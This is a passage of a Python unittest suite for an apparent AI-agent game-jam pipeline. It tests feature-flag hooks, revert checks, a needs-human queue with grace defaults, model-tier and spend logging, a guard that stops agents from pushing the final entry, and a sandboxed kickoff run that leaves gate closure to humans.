        before = read(hook)
        self.flag_table(root)
        self.assertEqual(read(hook), before)
        rc, out = self.effective(root)
        self.assertEqual(rc, 0, "card 0.27 filled the seam; the hook is unchanged:\n" + out)
        # broken on purpose: a hook that names flags one by one misses the rest, and one without ManifestVersion()
        write(hook, before.replace("Harness->ForEachFlag(", "Harness->IsFeatureEnabled(EFeatureId::UMB_02); (void)("))
        rc, out = self.effective(root)
        self.assertEqual(rc, 1, out)
        self.assertIn("does not report it", out)
        write(hook, before.replace("Harness->ManifestVersion()", "TEXT(\"\")"))
        rc, out = self.effective(root)
        self.assertEqual(rc, 1, out)
        self.assertIn("from another manifest", out)

    def test_h1_docs_name_the_seam(self):
        rules, cards = read(os.path.join(ROOT, "pipeline", "unreal-rules.md")), \
            read(os.path.join(ROOT, "pipeline", "day0-cards.md"))
        for want in ("ForEachFlag", "ManifestVersion()"):
            self.assertIn(want, rules)
            self.assertIn(want, read(os.path.join(ROOT, "pipeline", "roles", "technical-director.md")))
        row = next(ln for ln in cards.splitlines() if ln.startswith("| 0.6 |"))
        self.assertNotIn("saw ATTACK_DESCENT", row)   # MVP 2 has no Smoke/ in its lane

    # ---------- H2: a non-tip revert passes; anything extra still fails ----------
    def test_h2_non_tip_revert_survives_later_context_edits(self):
        check_pr = tools_mod("check_pr")
        d = self.tmp()

        def git(*a):
            p = subprocess.run(["git", "-c", "user.email=t@t", "-c", "user.name=t", *a], cwd=d, capture_output=True,
                               text=True)
            self.assertEqual(p.returncode, 0, p.stderr)
            return p.stdout.strip()
        rows = [f"| #{n} | planned |" for n in range(1, 11)]
        git("init", "-q", "-b", "main")
        write(os.path.join(d, "test-map.md"), "\n".join(rows) + "\n")
        git("add", "-A"); git("commit", "-qm", "base")
        rows[4] = "| #5 | merged |"
        write(os.path.join(d, "test-map.md"), "\n".join(rows) + "\n")
        git("commit", "-qam", "UE-30")
        target = git("rev-parse", "HEAD")
        rows[6] = "| #7 | merged |"   # a later card edits a row inside the revert's context
        write(os.path.join(d, "test-map.md"), "\n".join(rows) + "\n")
        git("commit", "-qam", "UE-31")
        base = git("rev-parse", "HEAD")
        git("checkout", "-qb", "revert")
        git("revert", "--no-edit", target)
        self.assertEqual(check_pr.revert_problems(d, target, base), [])
        # broken on purpose: one more line rides along
        with open(os.path.join(d, "test-map.md"), "a", encoding="utf-8") as fh:
            fh.write("| #11 | merged |\n")
        git("commit", "-qam", "extra")
        self.assertTrue(check_pr.revert_problems(d, target, base))

    # ---------- H3: struct and field together ----------
    def test_h3_same_field_name_in_two_structs(self):
        bp = tools_mod("bake_preset")
        root = self.tmp()
        src = os.path.join(root, "Source", "UmbrellaElla")
        write(os.path.join(src, "Public", "Core", "UmbrellaTuning.h"),
              '#include "Attack/AttackTuning.h"\n#include "Owl/OwlTuning.h"\n'
              "UCLASS(Config = Game)\nclass UMBRELLAELLA_API UUmbrellaTuning final : public UDeveloperSettings\n{\n"
              "\tGENERATED_BODY()\npublic:\n\tUPROPERTY(Config)\n\tFAttackTuning Attack;\n\n\tUPROPERTY(Config)\n"
              "\tFOwlTuning Owl;\n};\n")
        for comp, key, v in (("Attack", "COM-01.cadence", "0.65f"), ("Owl", "OWL-01.cadence", "2.0f")):
            write(os.path.join(src, "Public", comp, f"{comp}Tuning.h"),
                  f"USTRUCT()\nstruct F{comp}Tuning\n{{\n\tGENERATED_BODY()\n\n\tUPROPERTY(EditAnywhere)\n"
                  f"\tfloat Cadence = {v};   // bake: {key}\n}};\n")
        cpp = os.path.join(src, "Private", "Attack", "AttackEmitterComponent.cpp")
        write(cpp, "void UAttackEmitterComponent::Fire()\n{\n"
                   "\tconst float Cadence = GetDefault<UUmbrellaTuning>()->Attack.Cadence;\n}\n")
        probs = lambda: bp.one_source_problems(root, bp.markers(root))
        self.assertEqual(probs(), [], "both marked lines and the documented read pass")
        # broken on purpose: real writes name the right struct's key
        write(cpp, "void Hack(UUmbrellaTuning* T)\n{\n\tT->Owl.Cadence = 1.0f;\n}\n")
        got = probs()
        self.assertTrue(any(p.startswith("OWL-01.cadence:") for p in got), got)
        self.assertFalse(any(p.startswith("COM-01.cadence:") for p in got), got)
        write(cpp, "void FAttackTuning::Reset()\n{\n\tCadence = 0.5f;\n}\n")
        got = probs()
        self.assertTrue(any(p.startswith("COM-01.cadence:") for p in got), got)

    # ---------- H4: a card owns FLOW-37.master_volume ----------
    @staticmethod
    def owners(day0_text, key, header):
        import fnmatch
        pc = tools_mod("pipeline_check")
        out = []
        for ln in day0_text.splitlines():
            if not re.match(r"^\| 0\.\d+[a-z]? \|", ln):
                continue
            cells = pc.table_cells(ln)
            lanes = re.findall(r"`([^`]+)`", cells[4])
            if key in cells[6] and any(fnmatch.fnmatch(header, g.replace("**", "*")) for g in lanes):
                out.append(cells[0])
        return out

    def test_h4_master_volume_has_an_owner(self):
        text = read(os.path.join(ROOT, "pipeline", "day0-cards.md"))
        header = "Source/UmbrellaElla/Public/UI/UITuning.h"
        self.assertEqual(self.owners(text, "FLOW-37.master_volume", header), ["0.21"])
        self.assertIn("FUITuning UI;", read(os.path.join(FIX, "game", "s03", "Source", "UmbrellaElla", "Public", "Core",
                                                          "UmbrellaTuning.h")))
        broken = text.replace("`Source/UmbrellaElla/Public/UI/**`, ", "")
        self.assertEqual(self.owners(broken, "FLOW-37.master_volume", header), [], "a lane without the header")

    # ---------- H5: the unit suite passes with card 0.0's filled People table ----------
    def test_h5_filled_people_table_keeps_the_suite_green(self):
        d = self.tmp()
        for top in ("tools", "tests", "docs", "pipeline"):
            shutil.copytree(os.path.join(ROOT, top), os.path.join(d, top), ignore=shutil.ignore_patterns("__pycache__"))
        brief = os.path.join(d, "docs", "jam-brief.md")
        write(brief, re.sub(r"^\| Windows packaging machine \(owner, machine name, OS\) \|[^\n]*$",
                            "| Windows packaging machine (owner, machine name, OS) | Marta, MARTA-WS, Windows 11 | yes | "
                            "BLOCKER |", read(brief), flags=re.M))
        check_card = tools_mod("check_card")
        self.assertEqual(check_card.packaging_machine(d), "MARTA-WS")
        self.assertTrue(check_card.daily_host_problems("DAILY abc | RICK-PC/Windows 10 | x", d),
                        "broken on purpose: the old assertion fails on the filled brief")
        p = subprocess.run([PY, "-m", "unittest", "test_final10_fixes.GateRecordReruns.test_daily_host",
                            "test_final9_fixes.MachineRecords"], cwd=os.path.join(d, "tests"), capture_output=True,
                           text=True, timeout=300)
        self.assertEqual(p.returncode, 0, p.stderr[-2000:])

    # ---------- human in the loop: the needs-human label and queue ----------
    def test_needs_human_queue(self):
        cc = tools_mod("check_card")
        ask = {"number": 5, "labels": [{"name": "needs-human"}, {"name": "doing"}],
               "comments": [{"body": "ROLE: Producer | session 2026-11-12T10:00\nNEEDS HUMAN: Rick merge PR #9"}]}
        other = {"number": 7, "labels": [{"name": "doing"}], "comments": []}
        lines, probs = cc.needs_human_queue([ask, other])
        self.assertEqual((lines, probs), (["#5 Rick: merge PR #9"], []))
        bare = dict(ask, number=6, comments=[{"body": "please look at this"}])   # broken on purpose: no ask line
        self.assertTrue(cc.needs_human_queue([ask, bare])[1])
        agents = read(os.path.join(ROOT, "AGENTS.md"))
        self.assertIn("`needs-human`", agents)
        self.assertIn("pipeline/human-checkpoints.md", agents)
        self.assertIn("--needs-human", read(os.path.join(ROOT, "pipeline", "roles", "producer.md")))
        self.assertLess(len(read(os.path.join(ROOT, "pipeline", "how-to-run-the-jam.md")).split()), 600)

    # ---------- model tiers: one row per gates.json role, and each role card names its tier ----------
    @staticmethod
    def tier_rows(text):
        return {m.group(1): m.group(2).strip() for m in re.finditer(r"^\| ([a-z-]+) \| ([^|]+) \|$", text, re.M)}

    def test_every_role_has_a_model_tier(self):
        roles = json.loads(read(os.path.join(ROOT, "pipeline", "agent-ops", "gates.json")))["roles"]
        text = read(os.path.join(ROOT, "pipeline", "agent-ops", "model-tiers.md"))
        rows = self.tier_rows(text)
        self.assertEqual(sorted(r for r in roles if r not in rows), [], "a gates.json role has no tier row")
        for r in roles:
            card = read(os.path.join(ROOT, "pipeline", "roles", f"{r}.md"))
            self.assertIn(f"Model: {rows[r]} tier", card, r)
        self.assertIn("pipeline/agent-ops/model-tiers.md", read(os.path.join(ROOT, "AGENTS.md")))
        broken = text.replace("| audio | Building |\n", "")   # broken on purpose: a role loses its row
        self.assertNotIn("audio", self.tier_rows(broken))

    # ---------- M1, M3, M4 ----------
    def test_m1_day0_rows_have_seven_cells(self):
        pc = tools_mod("pipeline_check")
        root = self.tmp()
        text = read(os.path.join(ROOT, "pipeline", "day0-cards.md"))
        write(os.path.join(root, "pipeline", "day0-cards.md"), text)
        cells = [p for p in pc.consistency(root, []) if "cells, not 7" in p[2]]
        self.assertEqual(cells, [])
        self.assertEqual(sum(1 for ln in text.splitlines() if re.match(r"^\| 0\.\d+[a-z]? \|", ln)),
                         len(pc.day0_rows(text)))
        write(os.path.join(root, "pipeline", "day0-cards.md"),
              text.replace("prints 0)<br>The envelope", "piped `| wc -l` prints 0)<br>The envelope", 1))
        self.assertTrue([p for p in pc.consistency(root, []) if "cells, not 7" in p[2]])

    def test_m3_constexpr_flag_table_is_const(self):
        bp = tools_mod("bake_preset")
        root = self.tmp()
        h = os.path.join(root, "Source", "UmbrellaElla", "Public", "Harness", "FeatureFlags.h")
        write(h, "struct FFlagDefault\n{\n\tint32 Id;\n\tbool bOn;\n};\n")
        cpp = os.path.join(root, "Source", "UmbrellaElla", "Private", "Harness", "FeatureFlags.cpp")
        table = "{\n\t{ EFeatureId::UMB_02, true },   // bake: UMB-02.enabled\n};\n"
        write(cpp, "struct FFlagDefault;\nstatic constexpr FFlagDefault Defaults[] =\n" + table)
        nonconst = lambda: [p for p in bp.one_source_problems(root, bp.markers(root)) if "non-const" in p]
        self.assertEqual(nonconst(), [])
        write(cpp, "struct FFlagDefault;\nstatic FFlagDefault Defaults[] =\n" + table)
        got = nonconst()
        self.assertTrue(got and "static constexpr" in got[0], got)

    def test_m4_map_smoke_env_is_documented(self):
        doc = read(os.path.join(ROOT, "pipeline", "unreal", "commands-and-packaging.md"))
        self.assertIn("SMOKE_GAME_MAP=/Game/UmbrellaElla/Maps/<Map> SMOKE_MAP=<Map>", doc)
        check_pr = tools_mod("check_pr")
        line = ("SMOKE_OK map={} view=1920x1080 aspect=1.778 debugdraw=0 fps=58 worst_ms=24 commit=abc1234 input=none res=1920x1080 win=windowed textpx=20 "
                "load_ms=900 workbench=0")
        m = lambda mp: check_pr.SMOKE_LINE.search(line.format(mp))
        changed = ["Content/UmbrellaElla/Maps/L_StyleFrame.umap"]
        ok = [p for p in check_pr.smoke_contract_problems(m("L_StyleFrame"), changed, input_waived=True)
              if "changed map" in p]
        self.assertEqual(ok, [])
        bad = [p for p in check_pr.smoke_contract_problems(m("/Game/UmbrellaElla/Maps/L_Graybox"), changed,
                                                           input_waived=True) if "changed map" in p]
        self.assertTrue(bad)


class HonestStatusBoard(unittest.TestCase):
    """A normal jam hour: the Producer regenerates the status board from the saved gh output and the journal, with
    no network. It renders, shows the one needs-human ask with who and what, and exits 0. Broken on purpose: the
    same card labelled needs-human with no NEEDS HUMAN comment makes it exit 1."""

    def setUp(self):
        self.d = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.d, True)
        self.root = os.path.join(self.d, "repo")
        os.makedirs(os.path.join(self.root, "pipeline", "templates"))
        os.makedirs(os.path.join(self.root, "docs"))
        shutil.copy(os.path.join(ROOT, "pipeline", "templates", "task-card.md"),
                    os.path.join(self.root, "pipeline", "templates"))
        shutil.copy(os.path.join(SB_FIX, "jam-brief.md"), os.path.join(self.root, "docs"))
        self.db = os.path.join(self.d, "journal.db")
        journal = tools_mod("journal")
        con = journal.connect(self.db)
        journal.add(con, "UE-12", "start", role="gameplay-dev")
        con.close()

    def board(self, src):
        sb = tools_mod("status_board")
        out = os.path.join(self.d, "board.md")
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf), contextlib.redirect_stderr(io.StringIO()):
            code = sb.main(["--root", self.root, "--from-json", src, "--journal", self.db,
                            "--now", "2026-11-13T15:00-08:00", "--out", out])
        return code, buf.getvalue(), read(out)

    def test_hourly_board_shows_the_needs_human_ask(self):
        code, out, md = self.board(os.path.join(SB_FIX, "good"))
        self.assertEqual(code, 0, out)
        self.assertIn("#13 Richard: approve the arena width outside the 5A range #13", md)
        self.assertRegex(md, r"\| UE-12 \| gameplay-dev \| .* \| yes \| journal \|")
        self.assertIn("| #41 | UE-13 | UE-13: arena | draft | fail |", md)
        self.assertIn("needs-human=1", out)

    def test_broken_needs_human_without_the_ask_fails(self):
        src = os.path.join(self.d, "src")
        os.makedirs(src)
        with open(os.path.join(SB_FIX, "good", "issues.json"), encoding="utf-8") as fh:
            issues = json.load(fh)
        for it in issues:
            if it["number"] == 13:
                it["comments"] = []
        with open(os.path.join(src, "issues.json"), "w", encoding="utf-8") as fh:
            json.dump(issues, fh)
        shutil.copy(os.path.join(SB_FIX, "good", "prs.json"), src)
        code, out, _ = self.board(src)
        self.assertEqual(code, 1)
        self.assertIn("#13: labelled needs-human but no comment reads", out)


class HonestSpendAndLaunch(unittest.TestCase):
    """Gap items 2 and 4 on the honest path: a human launches a Building-tier role on a card (dry run picks Opus and
    sets JAM_ROLE), and a normal handoff logs the session's spend, which the summary shows by role and card."""

    def tmp(self):
        d = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, d, True)
        return d

    def human_env(self, d):
        env = {k: v for k, v in os.environ.items() if k not in ("CLAUDECODE", "JAM_ROLE", "JAM_CARD", "JAM_MODEL")}
        env.update(START_SESSION_NO_GH="1", JOURNAL_DB=os.path.join(d, "journal.db"),
                   SPEND_CSV=os.path.join(d, "spend.csv"), SPEND_AGENT_LOG=os.path.join(d, "agent-log"))
        return env

    def test_dry_run_launch_picks_sonnet_for_gameplay_dev(self):
        """Builders run Sonnet 5.5 (Josh, 2026-11-10; pipeline/agent-ops/model-tiers.md)."""
        env = self.human_env(self.tmp())
        r = subprocess.run([PY, os.path.join(ROOT, "tools", "start_session.py"), "gameplay-dev", "UE-12", "--dry-run"],
                           env=env, capture_output=True, text=True, cwd=ROOT)
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertIn("tier=Building model=claude-sonnet-5-5", r.stdout)
        self.assertIn("JAM_ROLE=gameplay-dev", r.stdout)
        self.assertIn("--model claude-sonnet-5-5", r.stdout)

    def test_handoff_logs_spend_and_summary_shows_it(self):
        d = self.tmp()
        env = self.human_env(d)
        os.makedirs(env["SPEND_AGENT_LOG"])
        with open(os.path.join(env["SPEND_AGENT_LOG"], "2026-11-12.jsonl"), "w", encoding="utf-8") as fh:
            fh.write(json.dumps({"ts": "2026-11-12T15:00:00+00:00", "event": "stop", "session": "s-honest",
                                 "role": "gameplay-dev", "card": "12",
                                 "tokens": {"input": 2000000, "output": 100000, "cache_read": 0,
                                            "cache_write": 0}}) + "\n")
        spend = os.path.join(ROOT, "tools", "spend_log.py")
        r = subprocess.run([PY, spend, "log", "--from-agent-log", "--since", "2026-11-12T00:00:00", "--role",
                            "gameplay-dev", "--card", "UE-12", "--model", "claude-opus-5-5"],
                           env=env, capture_output=True, text=True, cwd=ROOT)
        self.assertEqual(r.returncode, 0, r.stderr)
        r = subprocess.run([PY, spend, "summary"], env=env, capture_output=True, text=True, cwd=ROOT)
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertIn("role=gameplay-dev sessions=1 tokens=2100000 usd=$10.00", r.stdout)
        self.assertIn("card=UE-12 sessions=1", r.stdout)


class HonestOfficialRules(unittest.TestCase):
    """Round 13 on the honest path: the Official Rules PDF is pinned and every rules check passes on the real repo; an
    in-jam asset passes `assets`; the editor MCP is off until kickoff; an agent's butler push is blocked."""

    def run_tool(self, *args):
        return subprocess.run([PY, *args], capture_output=True, text=True, cwd=ROOT)

    def test_rules_pinned_and_cited(self):
        for args in (("tools/manifest_check.py",), ("tools/submission_check.py", "rules"),
                     ("tools/submission_check.py", "assets"), ("tools/submission_check.py", "english"),
                     ("tools/editor_mcp.py", "check")):
            with self.subTest(args=args):
                r = self.run_tool(*args)
                self.assertEqual(r.returncode, 0, r.stdout + r.stderr)

    def test_in_jam_sprite_passes_and_prejam_copy_fails(self):
        sc = tools_mod("submission_check")
        head = "asset_path,author,origin,tool,model_version,prompt,seed,input_images,date,licence,attribution\n"
        row = head + "Art/Sprites/ella_idle.png,Asset Specialist,made in jam,Aseprite,,,,,2026-11-12T09:10-08:00,team,none\n"
        self.assertEqual(sc.assets_problems(row, "", ROOT), [])
        self.assertTrue(sc.assets_problems(row.replace("2026-11-12T09:10-08:00", "2026-11-06"), "", ROOT))

    def test_agent_cannot_push_the_entry(self):
        hook = os.path.join(ROOT, "pipeline", "agent-ops", "hook.py")
        proj = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, proj, True)
        env = dict(os.environ, JAM_ROLE="qa-build", AGENT_OPS_PLATFORM="linux", CLAUDE_PROJECT_DIR=proj)
        payload = {"hook_event_name": "PreToolUse", "tool_name": "Bash", "cwd": proj, "session_id": "h",
                   "tool_input": {"command": "butler push Team_Game.zip team/game:windows-dev"}}
        r = subprocess.run([PY, hook, "guard"], input=json.dumps(payload), capture_output=True, text=True, env=env)
        self.assertEqual(r.returncode, 2)
        self.assertIn("Official Rules 17", r.stderr)


class HonestGraceDefault(unittest.TestCase):
    """The 2 h grace default on the honest path (pipeline/human-checkpoints.md): an agent asks, no human answers in
    2 h, the Producer's hourly sweep sees GRACE EXPIRED -> Producer, decides, records the grace row (manifest_check
    stays green), removes the label, and the card's work continues. A human's later answer supersedes it. Broken on
    purpose: a playtest ask never expires into a grace path, and a grace row for it fails manifest_check."""
    ASK = "ROLE: UI and UX | session 2026-11-12T10:00Z\nNEEDS HUMAN: Rick pick press-any-key or a Start button {} #17 2026-11-12T10:00Z"

    def issue(self, what="for the title screen", labels=("needs-human", "doing"), later=()):
        return {"number": 17, "title": "[UE-17] Title screen", "labels": [{"name": n} for n in labels],
                "comments": [{"body": self.ASK.format(what)}] + [{"body": b} for b in later]}

    def sweep(self, issues, now):
        r = subprocess.run([PY, os.path.join(ROOT, "tools", "check_card.py"), "--needs-human", "--now", now],
                           input=json.dumps(issues), capture_output=True, text=True, cwd=ROOT)
        return r.returncode, r.stdout

    def decide(self, row):
        text = read(os.path.join(ROOT, "docs", "decisions.md"))
        anchor = "| D34 |"
        self.assertIn(anchor, text)
        return text.replace(anchor, row + "\n" + anchor, 1)

    def test_item_expires_the_producer_decides_and_work_continues(self):
        mc, bp = tools_mod("manifest_check"), tools_mod("bake_preset")
        code, out = self.sweep([self.issue()], "2026-11-12T11:00Z")
        self.assertEqual(code, 0, out)
        self.assertIn("#17 Rick: pick press-any-key or a Start button for the title screen #17 grace ends "
                      "2026-11-12T12:00Z", out)
        code, out = self.sweep([self.issue()], "2026-11-12T12:05Z")
        self.assertEqual(code, 0, out)
        self.assertIn("GRACE EXPIRED -> Producer", out)
        # the Producer (Hard calls director session) decides and records it
        row = ("| D-new-ui-17 | Title screen: press any key, or a Start button? | Card 17 waits on it | Start button "
               "| none | Producer / time keeper, human | G2 | DECIDED 2026-11-12 (agent default after 2h grace; Producer; "
               "human may overturn). Chose a Start button (fewer accidental starts); rejected press-any-key. "
               "needs-human #17 |")
        decisions = self.decide(row)
        man = json.loads(read(os.path.join(ROOT, mc.MANIFEST)))
        snap = read(os.path.join(ROOT, mc.current_snapshot(ROOT)))
        presets = json.loads(read(os.path.join(ROOT, mc.PRESETS)))
        self.assertEqual(mc.problems(man, snap, presets, decisions), [])
        self.assertIn(row, bp.decided_rows(decisions), "the grace row counts as DECIDED")
        self.assertEqual(mc.decided_overrides(decisions), set(), "and lifts no P0 rule")
        # label removed after the Producer's comment: the queue is clear, the card is back in doing
        done = self.issue(labels=("doing",), later=["ROLE: Producer | session 2026-11-12T12:06Z\nDecided by D-new-ui-17"])
        code, out = self.sweep([done], "2026-11-12T12:10Z")
        self.assertEqual((code, out.strip().splitlines()[-1]), (0, "check_card --needs-human: 0 waiting, 0 problem(s)"))
        # Rick answers later: his answer wins in its own row, the grace row is superseded, and both still pass
        later = decisions.replace("needs-human #17 |", "needs-human #17. SUPERSEDED by D-new-ui-17b |").replace(
            "| D34 |", "| D-new-ui-17b | Title screen input (Rick's answer) | Card 17 | press any key | none | "
                       "Producer / time keeper, human | G2 | DECIDED 2026-11-13 (Rick). Press any key; #17 |\n| D34 |", 1)
        self.assertEqual(mc.problems(man, snap, presets, later), [])

    def test_broken_playtest_ask_never_gets_a_grace_default(self):
        mc = tools_mod("manifest_check")
        ask = self.issue(what="after playtest P4 on the packaged build")
        code, out = self.sweep([ask], "2026-11-12T15:00Z")
        self.assertEqual(code, 0, out)
        self.assertIn("HUMAN ONLY (physical work", out)
        self.assertNotIn("GRACE EXPIRED", out)
        row = ("| D-new-ui-17 | Skip playtest P4 for the title screen? | Card 17 | no | none | Producer / time keeper, "
               "human | G2 | DECIDED 2026-11-12 (agent default after 2h grace; Producer; human may overturn). "
               "needs-human #17 |")
        self.assertIn("grace", {k for k, _, _ in mc.problems(
            json.loads(read(os.path.join(ROOT, mc.MANIFEST))), read(os.path.join(ROOT, mc.current_snapshot(ROOT))),
            json.loads(read(os.path.join(ROOT, mc.PRESETS))), self.decide(row))})

    @staticmethod
    def grace_cells(text):
        body = text.split("## Where they happen", 1)[1]
        rows = [ln for ln in body.splitlines() if ln.startswith("| ") and not ln.startswith("| Checkpoint |")]
        return [ln.strip().strip("|").split("|")[3].strip() if ln.count("|") == 5 else "" for ln in rows]

    def test_every_checkpoint_row_says_grace_yes_or_no(self):
        text = read(os.path.join(ROOT, "pipeline", "human-checkpoints.md"))
        self.assertIn("| Checkpoint | Who acts | Source | Grace default |", text)
        cells = self.grace_cells(text)
        self.assertGreaterEqual(len(cells), 20)
        self.assertEqual([c for c in cells if not re.match(r"(?:yes|no)\b", c)], [])
        self.assertTrue(re.search(r"Every upload[^\n]*\| no \(1\) \|$", text, re.M), "the final upload stays human")
        broken = re.sub(r" no \(2\) \|$", " |", text, count=1, flags=re.M)   # broken on purpose: a row loses its cell
        self.assertTrue([c for c in self.grace_cells(broken) if not re.match(r"(?:yes|no)\b", c)])


@unittest.skipIf(NESTED, "nested CI run inside the honest suite")
@unittest.skipIf(shutil.which("git") is None, "needs git")
class HonestKickoff(unittest.TestCase):
    """One command, no typing (tools/kickoff.py): a Codex-style stub agent that obeys AGENTS.md
    (tests/fixtures/kickoff/stub_agent.py) runs from the Day-0 cards through G1 in practice mode. kickoff stops only at
    needs-human items, kickoff merges each approved PR itself once CI and check_pr pass and applies each gate patch
    through the tool checks, the test plays the humans (answer an ask), and each new run resumes from the journal and GitHub. Before the jam without the marker it stops in one
    line; a session that crashes is re-run; a review that asks for changes goes back to the builder."""

    @classmethod
    def setUpClass(cls):
        sys.path.insert(0, os.path.join(ROOT, "tests"))
        import kickoff_sandbox
        cls.ks = kickoff_sandbox
        cls.sb = kickoff_sandbox.KickoffSandbox(PEOPLE)
        cls.env = dict(STUB_SLEEP="0.2", STUB_FAIL_ONCE="UE-0.5", STUB_CHANGES_ONCE="UE-0.6",
                       OPENAI_API_KEY="fake-openai-HONESTNEVERINSESSION01234")
        cls.outs, cls.rounds, cls.stop = [], [], None
        rc, cls.prejam = cls.sb.kickoff("--agent", "codex", **cls.env)
        cls.prejam_rc = rc
        cls.prejam_sessions = list(cls.sb.sessions())
        cls.prejam_titles = [i["title"] for i in cls.sb.gh()["issues"]] if os.path.exists(cls.sb.state) else []
        rc, out = cls.sb.kickoff("--agent", "codex", "--practice", "--parallel", "3", **cls.env)
        cls.outs.append((rc, out))
        for _ in range(30):
            answered, stop = cls.sb.human_round()
            cls.rounds.append(answered)
            if stop:
                cls.stop = stop
                break
            rc, out = cls.sb.kickoff("--agent", "codex", "--parallel", "3", **cls.env)
            cls.outs.append((rc, out))
        cls.before_rerun = (cls.sb.gh(), len(cls.sb.sessions()))
        cls.rerun = cls.sb.kickoff("--agent", "codex", **cls.env)

    @classmethod
    def tearDownClass(cls):
        cls.sb.close()

    def test_before_the_start_only_the_pre_jam_cards_run(self):
        self.assertEqual(self.prejam_rc, 3, self.prejam)
        self.assertIn("PRE-JAM mode", self.prejam.splitlines()[0])
        self.assertIn("--practice", self.prejam.strip().splitlines()[-1])
        pre = tools_mod("check_card").prejam_cards(ROOT)
        ran = {s["card"] for s in self.prejam_sessions if s["event"] == "start"}
        self.assertIn("UE-0.25", ran, "the workbench sample runs before the start")
        self.assertTrue(ran <= {"KICKOFF-PRODUCER"} | {"UE-" + c for c in pre}, ran)
        filed = {t.split("]")[0].strip("[").replace("UE-", "") for t in self.prejam_titles}
        self.assertTrue(filed <= pre, filed - pre)

    def test_every_run_exits_0_with_no_errors(self):
        for rc, out in self.outs:
            self.assertEqual(rc, 0, out[-3000:])
            self.assertNotIn("ERROR", out, out[-3000:])
        self.assertIn("PRACTICE mode on", self.outs[0][1])

    def test_reaches_g1_and_leaves_it_to_a_human(self):
        self.assertIsNotNone(self.stop, "kickoff never asked for G1:\n" + self.outs[-1][1][-2000:])
        self.assertIn("close G1", self.stop)
        s = self.sb.gh()
        gate = next(i for i in s["issues"] if i["title"].startswith("[GATE] G1"))
        self.assertEqual(gate["state"], "OPEN", "kickoff never closes a gate")
        cc = tools_mod("check_card")
        lines, probs = cc.needs_human_queue([dict(gate, labels=[{"name": n} for n in gate["labels"]])])
        self.assertEqual(probs, [])
        self.assertTrue(lines and lines[0].startswith(f"#{gate['number']} Rick: close G1"), lines)

    def test_every_day0_card_filed_once_with_a_person_as_human(self):
        cards = [i for i in self.sb.gh()["issues"] if "task" in i["labels"]]
        titles = [i["title"] for i in cards]
        self.assertEqual(len(titles), len(set(titles)), "a resumed run filed a card twice")
        with open(os.path.join(ROOT, "pipeline", "day0-cards.md"), encoding="utf-8") as fh:
            rows = len(re.findall(r"^\| 0\.\d+[a-z]? \|", fh.read(), re.M))
        self.assertEqual(len(cards), rows)
        names = {"Rick", "Rich", "Ana", "Josh", "Richard"}
        for c in cards:
            human = re.search(r"### Human who runs and merges this\n\n(.*)\n", c["body"]).group(1).strip()
            self.assertIn(human, names, c["title"])
            self.assertEqual(c["state"], "CLOSED", c["title"])

    def test_sessions_codex_shaped_parallel_lanes_apart_no_keys(self):
        ss = self.sb.sessions()
        starts = [s for s in ss if s["event"] == "start"]
        self.assertEqual({s["agent"] for s in starts}, {"codex"})
        self.assertFalse(any(s["has_key"] for s in starts))
        spans, open_ = [], {}
        for s in ss:
            k = (s["card"], s["role"], s.get("review"))
            if s["event"] == "start":
                open_[s["card"] + s["role"]] = s["t"]
            else:
                spans.append((s["card"], open_.pop(s["card"] + s["role"]), s["t"]))
        overlap = [(a, b) for i, a in enumerate(spans) for b in spans[i + 1:]
                   if a[0] != b[0] and a[1] < b[2] and b[1] < a[2]]
        self.assertTrue(overlap, "no two card sessions ran at once")
        top = max(sum(1 for b in spans if b[1] <= a[1] < b[2]) for a in spans)
        self.assertLessEqual(top, 3, "more sessions at once than --parallel 3")
        kick = tools_mod("kickoff")
        cards = {}
        for it in self.sb.gh()["issues"]:
            if "task" in it["labels"]:
                c = kick.Card(dict(it, labels=[], state="OPEN"))
                cards["UE-" + c.key] = c.lanes
        for a, b in overlap:
            for ga in cards.get(a[0], []):
                for gb in cards.get(b[0], []):
                    self.assertFalse(tools_mod("check_card").globs_overlap(ga, gb), f"{a[0]} and {b[0]} share {ga}")

    def test_crash_is_rerun_and_changes_go_back_to_the_builder(self):
        s = self.sb.gh()
        prs = {p["headRefName"].split("-")[1]: p for p in s["prs"]}
        self.assertIn("0.5", prs, "UE-0.5 crashed once, then its rerun opened the PR")
        bodies = [c["body"] for c in prs["0.6"]["comments"]]
        self.assertTrue(any("VERDICT: changes" in b for b in bodies))
        self.assertTrue(any(b.startswith("ROLE:") and "PUSHED:" in b for b in bodies))
        self.assertTrue("VERDICT: approve" in bodies[-1] or any("VERDICT: approve" in b for b in bodies[-2:]))

    def test_journal_and_merged_main(self):
        import sqlite3
        con = sqlite3.connect(os.path.join(self.sb.base, "journal.db"))
        kinds = dict(con.execute("SELECT kind, COUNT(*) FROM events GROUP BY kind").fetchall())
        notes = [r[0] for r in con.execute("SELECT note FROM events WHERE note LIKE 'kickoff: %'")]
        con.close()
        self.assertGreater(kinds.get("start", 0), 40)
        self.assertTrue(any("opened PR" in n for n in notes) and any("asked" in n for n in notes))
        log = self.sb.git("log", "--format=%s", "origin/main")
        self.assertIn("Practice mode", log)
        self.assertRegex(log, r"UE-0\.5: .*\(#\d+\)")

    def test_rerun_is_idempotent(self):
        rc, out = self.rerun
        self.assertEqual(rc, 0, out)
        state, n = self.before_rerun
        after = self.sb.gh()
        self.assertEqual(len(after["issues"]), len(state["issues"]), "no new issue on a rerun")
        self.assertEqual(len(after["prs"]), len(state["prs"]), "no new PR on a rerun")
        new = [s for s in self.sb.sessions()[n:] if s["event"] == "start"]
        self.assertTrue(all(s["card"] == "KICKOFF-PRODUCER" for s in new), new)


@unittest.skipIf(NESTED, "nested CI run inside the honest suite")
@unittest.skipIf(shutil.which("git") is None, "needs git")
class HonestAgentAssets(unittest.TestCase):
    """Issue #13 end to end in practice mode: an art card (Blender render -> Aseprite sheet -> the art loop's blind
    critic panel -> the pass record kickoff commits), an audio card (ElevenLabs -> ffmpeg -> audio_check) and a video
    card (capture the packaged build -> ffmpeg cut -> submission_check video) are made by agents through
    tools/assetgen.py. Every API, app and critic is a stub (the stub Blender draws the frames from a finished team
    sheet, so the deterministic checks pass for real). The only human steps are the checkpoints: merging each
    approved PR. Card 101 is an art card: references.json assigns it the Ella rising sheet."""

    CRITIC = "pass"
    CARDS = (("101", "Ella idle flipbook", "Asset Specialist", "Art Director", "Rich",
